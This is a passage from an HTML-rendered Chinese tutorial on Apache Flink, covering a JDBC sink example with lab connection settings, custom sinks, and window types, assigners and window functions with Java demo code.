class="comment">         *    第四个参数： 连接选项 ---》 url、用户名、密码</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        SinkFunction&lt;WaterSensor&gt; jdbcSink = JdbcSink.sink(</span><br><span class="line">                <span class="string">"insert into ws values(?,?,?)"</span>,</span><br><span class="line">                <span class="keyword">new</span> JdbcStatementBuilder&lt;WaterSensor&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(PreparedStatement preparedStatement, WaterSensor waterSensor)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">                        <span class="comment">//每收到一条WaterSensor，如何去填充占位符</span></span><br><span class="line">                        preparedStatement.setString(<span class="number">1</span>, waterSensor.getId());</span><br><span class="line">                        preparedStatement.setLong(<span class="number">2</span>, waterSensor.getTs());</span><br><span class="line">                        preparedStatement.setInt(<span class="number">3</span>, waterSensor.getVc());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                JdbcExecutionOptions.builder()</span><br><span class="line">                        .withMaxRetries(<span class="number">3</span>) <span class="comment">// 重试次数</span></span><br><span class="line">                        .withBatchSize(<span class="number">100</span>) <span class="comment">// 批次的大小：条数</span></span><br><span class="line">                        .withBatchIntervalMs(<span class="number">3000</span>) <span class="comment">// 批次的时间</span></span><br><span class="line">                        .build(),</span><br><span class="line">                <span class="keyword">new</span> JdbcConnectionOptions.JdbcConnectionOptionsBuilder()</span><br><span class="line">                        .withUrl(<span class="string">"jdbc:mysql://hadoop102:3306/test?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=UTF-8"</span>)</span><br><span class="line">                        .withUsername(<span class="string">"root"</span>)</span><br><span class="line">                        .withPassword(<span class="string">"000000"</span>)</span><br><span class="line">                        .withConnectionCheckTimeoutSeconds(<span class="number">60</span>) <span class="comment">// 重试的超时时间</span></span><br><span class="line">                        .build()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        sensorDS.addSink(jdbcSink);</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-5-自定义Sink输出">4.5 自定义Sink输出</h3><p>如果我们想将数据存储到我们自己的存储设备中，而Flink并没有提供可以直接使用的连接器，就只能自定义Sink进行输出了。与Source类似，Flink为我们提供了通用的SinkFunction接口和对应的RichSinkDunction抽象类，只要实现它，通过简单地调用DataStream的.addSink()方法就可以自定义写入任何外部存储。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream.addSink(<span class="keyword">new</span> MySinkFunction&lt;String&gt;());</span><br></pre></td></tr></table></figure><p>在实现SinkFunction的时候，需要重写的一个关键方法invoke()，在这个方法中我们就可以实现将流里的数据发送出去的逻辑。这种方式比较通用，对于任何外部存储系统都有效；不过自定义Sink想要实现状态一致性并不容易，所以一般只在没有其它选择时使用</p><h1>五、Flink中的时间和窗口</h1><p>在批处理统计中，我们可以等待一批数据都到齐后，统一处理。但是在实时处理统计中，我们是来一条就得处理一条，那么我们怎么统计最近一段时间内的数据呢？引入“窗口”。所谓的“窗口”，一般就是划定的一段时间范围，也就是“时间窗”；对在这范围内的数据进行处理，就是所谓的窗口计算。</p><h2 id="1、窗口（Window）">1、窗口（Window）</h2><h3 id="1-1-概念">1.1 概念</h3><p>Flink是一种流式计算引擎，主要是来处理无界数据流的，数据源源不断、无穷无尽。想要更加方便高效地处理无界流，一种方式就是将无限数据切割成有限的“数据块”进行处理，这就是所谓的“窗口”（Window）</p><p>**注意：**Flink中窗口并不是静态准备好的，而是动态创建——当有落在这个窗口区间范围的数据达到时，才创建对应的窗口。另外，这里我们认为到达窗口结束时间时，窗口就触发计算并关闭，事实上“触发计算”和“窗口关闭”两个行为也可以分开</p><h3 id="1-2-窗口分类">1.2 窗口分类</h3><p><strong>按照驱动类型分</strong></p><ul><li>时间窗口：以时间点来定义窗口开始和结束</li><li>计数窗口：基于元素个数，到达固定个数触发计算关闭该窗口</li></ul><p><strong>按照窗口分配数据的规则分类</strong></p><ul><li>滚动窗口（Tumbling Window）：窗口之间没有重叠，也不会有间隔，每个数据都会被分配到一个窗口，而且只会属于一个窗口。可以基于时间和计数</li><li>滑动窗口（Sliding Window）：可以看做特殊的滚动窗口，数据可能会分配到多个窗口内</li><li>会话窗口（Session Window）：基于“会话”( session）来来对数据进行分组的，两会话窗口之间最小距离，只能基于时间 定义</li><li>以及全局窗口（Global Window）：窗口没有结束，默认不会触发计算</li></ul><h3 id="1-3-窗口API概览">1.3 窗口API概览</h3><p><strong>按键分区（Keyed）和非按键分区（Non-Keyed）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 相同key的数据会被发送到同一个并行子任务，而窗口操作会基于每个key进行单独的处理</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有进行keyBy，那么原始的DataStream就不会分成多条逻辑流。这时窗口逻辑只能在一个任务（task）上执行，就相当于并行度变成了1</span></span><br><span class="line">stream.windowAll(...)</span><br><span class="line"><span class="comment">// 注意：对于非按键分区的窗口操作，手动调大窗口算子的并行度也是无效的，windowAll本身就是一个非并行的操作</span></span><br></pre></td></tr></table></figure><p><strong>代码中窗口API的调用</strong></p><p>窗口操作主要有两个部分：窗口分配器（Window Assigners）和窗口函数（Window Functions）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream.keyBy(&lt;key selector&gt;)</span><br><span class="line">       .window(&lt;window assigner&gt;)</span><br><span class="line">       .aggregate(&lt;window function&gt;)</span><br></pre></td></tr></table></figure><h3 id="1-4-窗口分配器">1.4 窗口分配器</h3><p><strong>时间窗口</strong></p><p>时间窗口是最常用的窗口类型，又可以细分为滚动、滑动和会话三种</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 滚动处理时间窗口</span></span><br><span class="line"><span class="comment">// 窗口分配器由类TumblingProcessingTimeWindows提供，需要调用它的静态方法.of()</span></span><br><span class="line"><span class="comment">// 一个长度为5秒的滚动窗口</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">5</span>)))</span><br><span class="line">       .aggregate(...)</span><br><span class="line"><span class="comment">// 另外，.of()还有一个重载方法，可以传入两个Time类型的参数：size和offset。第一个参数当然还是窗口大小，第二个参数则表示窗口起始点的偏移量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 滑动处理时间窗口</span></span><br><span class="line"><span class="comment">// 窗口分配器由类SlidingProcessingTimeWindows提供，同样需要调用它的静态方法.of()</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(SlidingProcessingTimeWindows.of(Time.seconds(<span class="number">10</span>)，Time.seconds(<span class="number">5</span>)))</span><br><span class="line">       .aggregate(...)</span><br><span class="line"><span class="comment">// 这里.of()方法需要传入两个Time类型的参数：size和slide，前者表示滑动窗口的大小，后者表示滑动窗口的滑动步长。我们这里创建了一个长度为10秒、滑动步长为5秒的滑动窗口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理时间会话窗口</span></span><br><span class="line"><span class="comment">// 窗口分配器由类ProcessingTimeSessionWindows提供，需要调用它的静态方法.withGap()或者.withDynamicGap()</span></span><br><span class="line"><span class="comment">// 这里.withGap()方法需要传入一个Time类型的参数size，表示会话的超时时间，也就是最小间隔session gap。我们这里创建了静态会话超时时间为10秒的会话窗口</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(ProcessingTimeSessionWindows.withGap(Time.seconds(<span class="number">10</span>)))</span><br><span class="line">       .aggregate(...)</span><br><span class="line"><span class="comment">// 另外，还可以调用withDynamicGap()方法定义session gap的动态提取逻辑</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 滚动事件时间窗口</span></span><br><span class="line"><span class="comment">// 窗口分配器由类TumblingEventTimeWindows提供，用法与滚动处理事件窗口完全一致</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">5</span>)))</span><br><span class="line">       .aggregate(...)</span><br><span class="line">       </span><br><span class="line"><span class="comment">// 滑动事件时间窗口</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(SlidingEventTimeWindows.of(Time.seconds(<span class="number">10</span>)，Time.seconds(<span class="number">5</span>)))</span><br><span class="line">       .aggregate(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事件时间会话窗口</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(EventTimeSessionWindows.withGap(Time.seconds(<span class="number">10</span>)))</span><br><span class="line">       .aggregate(...)</span><br></pre></td></tr></table></figure><p><code>TumblingProcessingTimeWindows</code>和<code>TumblingEventTimeWindows</code>是Apache Flink中两种不同类型的窗口，用于基于处理时间和事件时间进行窗口操作的区别如下：</p><ul><li>TumblingProcessingTimeWindows（基于处理时间的滚动窗口）：<ul><li><code>TumblingProcessingTimeWindows</code>是根据处理时间对数据流进行窗口划分的方式。</li><li>窗口的大小是固定的，并且在处理时间上滚动。例如，如果窗口大小设置为10秒，则在处理时间上，每隔10秒窗口会向前移动一次，将新到达的数据放入新的窗口中。</li><li>窗口的触发是基于处理时间的进展，而与数据的时间戳无关。</li><li>适用于处理实时数据，无需考虑事件的时间戳顺序或水位线的进展。</li></ul></li><li>TumblingEventTimeWindows（基于事件时间的滚动窗口）：<ul><li><code>TumblingEventTimeWindows</code>是根据事件时间对数据流进行窗口划分的方式。</li><li>窗口的大小是固定的，并且在事件时间上滚动。例如，如果窗口大小设置为10分钟，则根据事件时间，每隔10分钟窗口会向前移动一次，将新到达的数据放入新的窗口中。</li><li>窗口的触发是基于水位线（Watermark）的进展和事件时间的顺序。只有在水位线越过窗口结束时间时，才会触发该窗口的计算。</li><li>适用于处理具有事件时间特性的数据，需要考虑数据的时间戳顺序和水位线的进展。</li></ul></li></ul><p>总结： <code>TumblingProcessingTimeWindows</code>适用于实时数据处理，基于处理时间划分窗口；而<code>TumblingEventTimeWindows</code>适用于具有事件时间特性的数据处理，基于事件时间划分窗口，并根据水位线触发窗口计算。选择哪种窗口类型取决于数据流的特点和需求</p><p><strong>计数窗口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 滚动计数窗口</span></span><br><span class="line"><span class="comment">// 滚动计数窗口只需要传入一个长整型的参数size，表示窗口的大小</span></span><br><span class="line"><span class="comment">// 我们定义了一个长度为10的滚动计数窗口，当窗口中元素数量达到10的时候，就会触发计算执行并关闭窗口</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .countWindow(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 滑动计数窗口</span></span><br><span class="line"><span class="comment">// 们定义了一个长度为10、滑动步长为3的滑动计数窗口。每个窗口统计10个数据，每隔3个数据就统计输出一次结果</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .countWindow(<span class="number">10</span>，<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><strong>全局窗口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局窗口是计数窗口的底层实现，一般在需要自定义窗口时使用。它的定义同样是直接调用.window()，分配器由GlobalWindows类提供</span></span><br><span class="line"><span class="comment">// 需要注意使用全局窗口，必须自行定义触发器才能实现窗口计算，否则起不到任何作用</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(GlobalWindows.create());</span><br></pre></td></tr></table></figure><h3 id="1-5-窗口函数">1.5 窗口函数</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646753.png" alt></p><p>窗口函数定义了要对窗口中收集的数据做的计算操作，根据处理的方式可以分为两类：<strong>增量聚合函数和全窗口函数</strong>。</p><p><strong>增量聚合函数（ReduceFunction / AggregateFunction）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 归约函数（ReduceFunction）</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowReduceDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .keyBy(r -&gt; r.getId())</span><br><span class="line">                <span class="comment">// 设置滚动事件时间窗口</span></span><br><span class="line">                .window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">10</span>)))</span><br><span class="line">                .reduce(<span class="keyword">new</span> ReduceFunction&lt;WaterSensor&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> WaterSensor <span class="title">reduce</span><span class="params">(WaterSensor value1, WaterSensor value2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        System.out.println(<span class="string">"调用reduce方法，之前的结果:"</span>+value1 + <span class="string">",现在来的数据:"</span>+value2);</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> WaterSensor(value1.getId(), System.currentTimeMillis(),value1.getVc()+value2.getVc());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 聚合函数（AggregateFunction）</span></span><br><span class="line"><span class="comment">// AggregateFunction的工作原理是：首先调用createAccumulator()为任务初始化一个状态（累加器）；</span></span><br><span class="line"><span class="comment">// 而后每来一个数据就调用一次add()方法，对数据进行聚合，得到的结果保存在状态中；等到了窗口需要输出时，再调用getResult()方法得到计算结果。</span></span><br><span class="line"><span class="comment">// 很明显，与ReduceFunction相同，AggregateFunction也是增量式的聚合；而由于输入、中间状态、输出的类型可以不同，使得应用更加灵活方便</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowAggregateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;WaterSensor, String&gt; sensorKS = sensorDS.keyBy(sensor -&gt; sensor.getId());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 窗口分配器</span></span><br><span class="line">        WindowedStream&lt;WaterSensor, String, TimeWindow&gt; sensorWS = sensorKS.window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">10</span>)));</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; aggregate = sensorWS</span><br><span class="line">                .aggregate(</span><br><span class="line">                        <span class="keyword">new</span> AggregateFunction&lt;WaterSensor, Integer, String&gt;() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> Integer <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                                System.out.println(<span class="string">"创建累加器"</span>);</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> Integer <span class="title">add</span><span class="params">(WaterSensor value, Integer accumulator)</span> </span>&#123;</span><br><span class="line">                                System.out.println(<span class="string">"调用add方法,value="</span>+value);</span><br><span class="line">                                <span class="keyword">return</span> accumulator + value.getVc();</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> String <span class="title">getResult</span><span class="params">(Integer accumulator)</span> </span>&#123;</span><br><span class="line">                                System.out.println(<span class="string">"调用getResult方法"</span>);</span><br><span class="line">                                <span class="keyword">return</span> accumulator.toString();</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> Integer <span class="title">merge</span><span class="params">(Integer a, Integer b)</span> </span>&#123;</span><br><span class="line">                                System.out.println(<span class="string">"调用merge方法"</span>);</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">        </span><br><span class="line">        aggregate.print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Flink也为窗口的聚合提供了一系列预定义的简单聚合方法，可以直接基于WindowedStream调用。主要包括.sum()/max()/maxBy()/min()/minBy()，与KeyedStream的简单聚合非常相似。它们的底层，其实都是通过AggregateFunction来实现的</span></span><br></pre></td></tr></table></figure><p><strong>全窗口函数（full window functions）</strong></p><p>在Flink中，全窗口函数也有两种：WindowFunction和ProcessWindowFunction</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 窗口函数（WindowFunction）</span></span><br><span class="line"><span class="comment">// 不过WindowFunction能提供的上下文信息较少，也没有更高级的功能。事实上，它的作用可以被ProcessWindowFunction全覆盖，所以之后可能会逐渐弃用</span></span><br><span class="line">stream</span><br><span class="line">    .keyBy(&lt;key selector&gt;)</span><br><span class="line">    .window(&lt;window assigner&gt;)</span><br><span class="line">    .apply(<span class="keyword">new</span> MyWindowFunction());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理窗口函数（ProcessWindowFunction）</span></span><br><span class="line"><span class="comment">// 可以拿到窗口中的所有数据之外，ProcessWindowFunction还可以获取到一个“上下文对象”（Context）</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowProcessDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;WaterSensor, String&gt; sensorKS = sensorDS.keyBy(sensor -&gt; sensor.getId());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 窗口分配器</span></span><br><span class="line">        WindowedStream&lt;WaterSensor, String, TimeWindow&gt; sensorWS = sensorKS.window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">10</span>)));</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; process = sensorWS</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> ProcessWindowFunction&lt;WaterSensor, String, String, TimeWindow&gt;() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(String s, Context context, Iterable&lt;WaterSensor&gt; elements, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">long</span> count = elements.spliterator().estimateSize();</span><br><span class="line">                                <span class="keyword">long</span> windowStartTs = context.window().getStart();</span><br><span class="line">                                <span class="keyword">long</span> windowEndTs = context.window().getEnd();</span><br><span class="line">                                String windowStart = DateFormatUtils.format(windowStartTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line">                                String windowEnd = DateFormatUtils.format(windowEndTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line"></span><br><span class="line">                                out.collect(<span class="string">"key="</span> + s + <span class="string">"的窗口["</span> + windowStart + <span class="string">","</span> + windowEnd + <span class="string">")包含"</span> + count + <span class="string">"条数据===&gt;"</span> + elements.toString());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        process.print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>增量聚合和全窗口函数的结合使用</strong></p><p>我们之前在调用WindowedStream的.reduce()和.aggregate()方法时，只是简单地直接传入了一个ReduceFunction或AggregateFunction进行增量聚合。除此之外，其实还可以传入第二个参数：一个全窗口函数，可以是WindowFunction或者ProcessWindowFunction</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ReduceFunction与WindowFunction结合</span></span><br><span class="line"><span class="keyword">public</span> &lt;R&gt; <span class="function">SingleOutputStreamOperator&lt;R&gt; <span class="title">reduce</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        ReduceFunction&lt;T&gt; reduceFunction，WindowFunction&lt;T，R，K，W&gt; function)</span> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// ReduceFunction与ProcessWindowFunction结合</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> &lt;R&gt; SingleOutputStreamOperator&lt;R&gt; <span class="title">reduce</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        ReduceFunction&lt;T&gt; reduceFunction，ProcessWindowFunction&lt;T，R，K，W&gt; function)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// AggregateFunction与WindowFunction结合</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> &lt;ACC，V，R&gt; SingleOutputStreamOperator&lt;R&gt; <span class="title">aggregate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        AggregateFunction&lt;T，ACC，V&gt; aggFunction，WindowFunction&lt;V，R，K，W&gt; windowFunction)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// AggregateFunction与ProcessWindowFunction结合</span></span></span><br><span class="line"><span class="function"><span 